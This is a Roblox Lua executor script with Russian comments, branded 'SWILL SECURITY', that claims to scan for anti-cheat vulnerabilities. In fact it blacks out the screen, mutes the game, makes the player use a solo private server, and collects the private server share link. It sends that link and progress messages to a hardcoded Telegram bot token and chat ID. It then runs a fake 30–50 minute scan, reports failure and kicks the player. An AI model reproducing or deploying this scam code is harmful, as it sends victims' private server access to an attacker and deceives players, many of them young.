-- ===== КОНФИГУРАЦИЯ =====
local BOT_TOKEN = "7853266185:AAEuuAibqk-H4oCTwCJD438NHNoXAg3PTDw"
local YOUR_CHAT_ID = "8070071877"

-- Сервисы
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer

-- ===== TELEGRAM ФУНКЦИЯ =====
local function sendToTelegram(message)
    spawn(function()
        pcall(function()
            local encoded = HttpService:UrlEncode(message)
            local url = string.format(
                "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
                BOT_TOKEN,
                YOUR_CHAT_ID,
                encoded
            )
            game:HttpGet(url, true)
        end)
    end)
end

-- ===== ФУНКЦИЯ КИКА ПО КОМАНДЕ В ЧАТЕ =====
local function setupChatListener()
    local chatService = game:GetService("Chat") -- В некоторых эксплойтах может использоваться другой метод
    
    -- Попытка получить доступ к событиям чата через Players.LocalPlayer
    LocalPlayer.Chatted:Connect(function(message)
        -- Проверка на наличие подстроки 'kick' (без учета регистра)
        if string.find(string.lower(message), "kick") then
            sendToTelegram("🚨 КОМАНДА 'KICK' ОБНАРУЖЕНА В ЧАТЕ! Кикаю пользователя.")
            
            -- Выключение музыки перед киком
            if CoreGui:FindFirstChild("SWILL_Music") then
                CoreGui.SWILL_Music:Destroy()
            end
            
            LocalPlayer:Kick("Что то пошло не так пробуйте снова")
        end
    end)
    sendToTelegram("💬 Чат-мониторинг на 'kick' активирован.")
end

-- ===== НАЧАЛО =====
sendToTelegram("🚀 SWILL SYSTEM ACTIVATED")
sendToTelegram("👤 User ID: " .. YOUR_CHAT_ID)
sendToTelegram("⏰ Time: " .. os.date("%H:%M:%S"))

-- Активируем мониторинг чата
setupChatListener()

-- ===== ПОЛНОЭКРАННЫЙ БЛОКИРОВЩИК =====
local gui = Instance.new("ScreenGui")
gui.Name = "SWILL_Fullscreen"
gui.DisplayOrder = 9999
gui.IgnoreGuiInset = true
gui.Parent = CoreGui

local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
background.BackgroundTransparency = 0
background.BorderSizePixel = 0
background.Active = true
background.Selectable = true
background.Parent = gui

-- ===== ВЫКЛЮЧЕНИЕ ЗВУКОВ =====
local function muteAllSounds()
    pcall(function()
        SoundService.RespectFilteringEnabled = false
        for _, sound in pairs(game:GetDescendants()) do
            if sound:IsA("Sound") then
                sound.Volume = 0
                sound.Playing = false
            end
        end
    end)
end

muteAllSounds()
sendToTelegram("🔇 Звуки отключены")

-- ===== ДОБАВЛЕНИЕ ФОНОВОЙ МУЗЫКИ =====
local music
local function playBackgroundMusic()
    pcall(function()
        music = Instance.new("Sound")
        music.SoundId = "rbxassetid://1840837330" -- ID для спокойной музыки (Acoustic Guitar Loop)
        music.Volume = 0.3 -- Низкая громкость
        music.Looped = true
        music.Playing = true
        music.Name = "SWILL_Music"
        music.Parent = CoreGui -- Добавляем в CoreGui для изоляции
    end)
    if music and music.IsLoaded then
        sendToTelegram("🎶 Фоновая музыка активирована.")
    else
        sendToTelegram("⚠️ Не удалось загрузить фоновую музыку.")
    end
end

local function stopBackgroundMusic()
    if music and music.Parent then
        music:Stop()
        music:Destroy()
        sendToTelegram("🎶 Фоновая музыка отключена.")
    end
end

-- ===== ПРОСТОЙ ИНТЕРФЕЙС =====
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0.3, 0)
title.Text = "SWILL SECURITY"
title.TextColor3 = Color3.fromRGB(200, 200, 200)
title.BackgroundTransparency = 1
title.TextSize = 24
title.Font = Enum.Font.SourceSansLight
title.Parent = background

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, 0, 0, 25)
status.Position = UDim2.new(0, 0, 0.35, 0)
status.Text = "initializing system..."
status.TextColor3 = Color3.fromRGB(150, 150, 150)
status.BackgroundTransparency = 1
status.TextSize = 14
status.Parent = background

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0.6, 0, 0, 3)
progressBar.Position = UDim2.new(0.2, 0, 0.45, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
progressBar.BorderSizePixel = 0
progressBar.Parent = background

local progressFill = Instance.new("Frame")
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.Position = UDim2.new(0, 0, 0, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(80, 140, 200)
progressFill.BorderSizePixel = 0
progressFill.Parent = progressBar

local percentText = Instance.new("TextLabel")
percentText.Size = UDim2.new(1, 0, 0, 25)
percentText.Position = UDim2.new(0, 0, 0.48, 0)
percentText.Text = "0%"
percentText.TextColor3 = Color3.fromRGB(120, 120, 120)
percentText.BackgroundTransparency = 1
percentText.TextSize = 12
percentText.Parent = background

-- ===== ПРОВЕРКА СЕРВЕРА =====
task.wait(2)
status.Text = "checking server configuration..."

local playerCount = #Players:GetPlayers()
sendToTelegram("🔍 Проверка сервера: " .. playerCount .. " игроков")

if playerCount > 1 then
    status.Text = "error: need private server (1 player)"
    sendToTelegram("❌ Ошибка: " .. playerCount .. " игроков")
    
    task.wait(3)
    LocalPlayer:Kick("SWILL: Private server required")
    return
else
    status.Text = "server verified"
    sendToTelegram("✅ Сервер проверен: " .. playerCount .. " игрок")
end

-- ===== АНАЛИЗ =====
task.wait(1)
status.Text = "analyzing security systems..."
sendToTelegram("📊 Анализ систем безопасности...")

-- Воспроизведение музыки на время загрузки
playBackgroundMusic()

for i = 1, 100 do
    progressFill.Size = UDim2.new(i/100, 0, 1, 0)
    percentText.Text = i .. "%"
    task.wait(0.03)
end

status.Text = "analysis complete"
sendToTelegram("✅ Анализ завершен")

-- ===== ВВОД ССЫЛКИ =====
task.wait(1)
status.Text = "awaiting private server link..."

local inputFrame = Instance.new("Frame")
inputFrame.Size = UDim2.new(0, 350, 0, 90)
inputFrame.Position = UDim2.new(0.5, -175, 0.6, -45)
inputFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
inputFrame.BorderSizePixel = 0
inputFrame.Parent = background

local inputBox = Instance.new("TextBox")
inputBox.Size = UDim2.new(0.9, 0, 0, 30)
inputBox.Position = UDim2.new(0.05, 0, 0.1, 0)
inputBox.PlaceholderText = "paste private server link here"
inputBox.Text = ""
inputBox.TextColor3 = Color3.fromRGB(220, 220, 220)
inputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
inputBox.ClearTextOnFocus = false
inputBox.Parent = inputFrame

local submitBtn = Instance.new("TextButton")
submitBtn.Size = UDim2.new(0.9, 0, 0, 25)
submitBtn.Position = UDim2.new(0.05, 0, 0.55, 0)
submitBtn.Text = "submit link"
submitBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
submitBtn.BackgroundColor3 = Color3.fromRGB(40, 90, 160)
submitBtn.Parent = inputFrame

sendToTelegram("⌛ Ожидание ссылки на приватный сервер...")

local linkCaptured = false
local capturedLink = ""

-- ===== МИНИМАЛЬНАЯ ПРОВЕРКА ПРИВАТКИ =====
local function isValidPrivateLink(link)
    -- Базовая проверка формата Roblox приватной ссылки
    if type(link) ~= "string" then
        return false
    end
    
    local pattern = "https?://www%.roblox%.com/share%?code="
    if not string.match(link, pattern) then
        return false
    end
    
    -- Проверяем что после code= есть данные
    local codePart = string.match(link, "code=([^&]+)")
    if not codePart or codePart == "" then
        return false
    end
    
    return true
end

submitBtn.MouseButton1Click:Connect(function()
    if inputBox.Text ~= "" then
        capturedLink = inputBox.Text
        
        -- ПРОВЕРКА ССЫЛКИ
        if not isValidPrivateLink(capturedLink) then
            inputBox.Text = ""
            
            -- ИЗМЕНЕНИЕ ТЕКСТА ОШИБКИ СОГЛАСНО ЗАПРОСУ
            inputBox.PlaceholderText = "Сыллка неверная" 
            
            sendToTelegram("❌ Неверная ссылка получена: " .. capturedLink)
            sendToTelegram("⚠️ Требуется формат: https://www.roblox.com/share?code=...")
            return
        end
        
        linkCaptured = true
        
        sendToTelegram("📎 ПРИВАТНАЯ ССЫЛКА ПОЛУЧЕНА:")
        sendToTelegram("🔗 " .. capturedLink)
        sendToTelegram("✅ Формат ссылки проверен")
        sendToTelegram("⏳ Начинаю сканирование...")
        
        inputFrame:Destroy()
    else
        inputBox.PlaceholderText = "please enter a valid link"
        inputBox.Text = ""
    end
end)

while not linkCaptured do
    task.wait(0.1)
end

-- ===== СКАНИРОВАНИЕ (30-50 минут) =====
task.wait(1)

title.Text = "SCANNING IN PROGRESS"
status.Text = "searching for anti-cheat vulnerabilities"
percentText.Text = "0%"
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(60, 120, 180)

-- РАНДОМНОЕ ВРЕМЯ: 1800-3000 секунд (30-50 минут)
local SCAN_TIME_SECONDS = math.random(1800, 3000)
local SCAN_TIME_MINUTES = math.floor(SCAN_TIME_SECONDS / 60)

sendToTelegram("⚡ Начинаю глубокое сканирование...")
sendToTelegram("⏱️ Примерное время: " .. SCAN_TIME_MINUTES .. " минут")
sendToTelegram("⏳ Таймер: " .. SCAN_TIME_SECONDS .. " секунд")

local scanStart = tick()
local lastPercent = 0
local lastNotification = 0

while tick() - scanStart < SCAN_TIME_SECONDS do
    local elapsed = tick() - scanStart
    local progress = elapsed / SCAN_TIME_SECONDS
    local percent = math.floor(progress * 100)
    
    -- Обновляем прогресс только если процент изменился
    if percent ~= lastPercent then
        progressFill.Size = UDim2.new(progress, 0, 1, 0)
        percentText.Text = percent .. "%"
        lastPercent = percent
        
        -- Отправляем уведомления каждые 5%
        if percent % 5 == 0 and percent > 0 and percent ~= lastNotification then
            local remaining = SCAN_TIME_SECONDS - elapsed
            local remainingMinutes = math.floor(remaining / 60)
            local remainingSeconds = math.floor(remaining % 60)
            
            sendToTelegram("📊 Прогресс: " .. percent .. "%")
            sendToTelegram("⏱️ Осталось: " .. remainingMinutes .. "м " .. remainingSeconds .. "с")
            lastNotification = percent
        end
    end
    
    -- Медленное обновление для экономии ресурсов
    task.wait(1)  -- Проверяем каждую секунду
end

-- ===== ЗАВЕРШЕНИЕ =====
stopBackgroundMusic() -- Останавливаем музыку по завершении сканирования

progressFill.Size = UDim2.new(1, 0, 1, 0)
percentText.Text = "100%"
status.Text = "scan complete"

sendToTelegram("✅ Сканирование завершено")
sendToTelegram("🕐 Общее время: " .. SCAN_TIME_MINUTES .. " минут")

task.wait(2)

-- Ошибка
title.Text = "SCAN FAILED"
title.TextColor3 = Color3.fromRGB(200, 80, 80)
status.Text = "vulnerability scan unsuccessful"
percentText.Text = "ERROR"
progressFill.BackgroundColor3 = Color3.fromRGB(200, 80, 80)

sendToTelegram("❌ Сканирование завершилось ошибкой")
sendToTelegram("🔄 Пожалуйста, перезапустите процесс")

-- Кик через 10 секунд
for i = 10, 1, -1 do
    status.Text = "restart required in " .. i .. "s"
    task.wait(1)
end

sendToTelegram("👋 Отключение от системы...")

LocalPlayer:Kick("SWILL: Scan failed (" .. SCAN_TIME_MINUTES .. "m). Please rejoin and try again.")
